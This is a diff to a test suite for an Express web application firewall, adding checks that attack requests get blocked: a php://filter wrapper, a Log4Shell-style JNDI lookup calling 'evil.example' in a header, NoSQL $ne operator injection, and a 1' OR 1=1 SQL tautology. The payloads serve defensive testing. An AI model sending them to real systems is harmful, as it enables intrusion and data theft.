@@ -188,8 +188,26 @@ async function runCoreScenarios(target) {
     403,
   );
 
+  await expectStatus(
+    target,
+    '5b RFI php:// stream wrapper',
+    `/search?q=${encodeURIComponent('php://filter/convert.base64-encode/resource=index')}`,
+    403,
+  );
+
   await expectStatus(target, '6 scanner UA sqlmap', '/', 403, {
     headers: { 'user-agent': 'sqlmap/1.7#integration' },
+  });
+
+  // Log4Shell-style lookup smuggled through a header, not the query string.
+  await expectStatus(target, '6b JNDI lookup in header', '/', 403, {
+    headers: { 'user-agent': '${jndi:ldap://evil.example/a}' },
+  });
+
+  await expectStatus(target, '6c NoSQL operator in body', '/echo', 403, {
+    method: 'POST',
+    headers: { 'content-type': 'application/json' },
+    body: JSON.stringify({ user: { $ne: null }, pass: { $ne: null } }),
   });
 
   await expectStatus(target, '7 health clean', '/health', 200);
@@ -230,9 +248,12 @@ async function runCoreScenarios(target) {
   }
 }
 
+// Every SQLi rule that can match `1' OR 1=1` on the query string; the smoke
+// test asserts that turning them all off lets the payload through.
 const DISABLED_SQLI_IDS = [
   'preset-sqli-classic-query',
   'preset-sqli-advanced-query',
+  'preset-sqli-tautology',
 ];
 
 const CUSTOM_BLOCK_RULE = {
@@ -256,6 +277,38 @@ async function withEphemeralServer(setup, run) {
   } finally {
     await new Promise((resolve) => server.close(resolve));
   }
+}
+
+/**
+ * Express 4's default query parser — and Express 5 with `query parser`
+ * set to `extended` — turns `?user[$ne]=null` into a nested object. The WAF
+ * has to flatten that without throwing, and still see the operator.
+ */
+async function runNestedQuerySmoke() {
+  log('\n== ephemeral · nested query parser ==');
+
+  await withEphemeralServer(
+    (app) => {
+      app.set('query parser', 'extended');
+      app.use(expressWaf({ presets: ['default'], level: 'balanced' }));
+      app.get('/search', (req, res) => res.json({ ok: true }));
+    },
+    async (port) => {
+      const attack = await request(port, '/search?user[$ne]=null');
+      resultLine(
+        attack.status === 403,
+        'express · 11 nested query NoSQL operator blocked',
+        `status ${attack.status}`,
+      );
+
+      const clean = await request(port, '/search?filter[status]=open');
+      resultLine(
+        clean.status === 200,
+        'express · 11b nested query clean request allowed',
+        `status ${clean.status}`,
+      );
+    },
+  );
 }
 
 async function runDisabledRuleIdsSmoke() {
@@ -391,6 +444,7 @@ async function main() {
     for (const target of TARGETS) {
       await runCoreScenarios(target);
     }
+    await runNestedQuerySmoke();
     await runDisabledRuleIdsSmoke();
     await runCustomRuleSmoke();
   } finally {
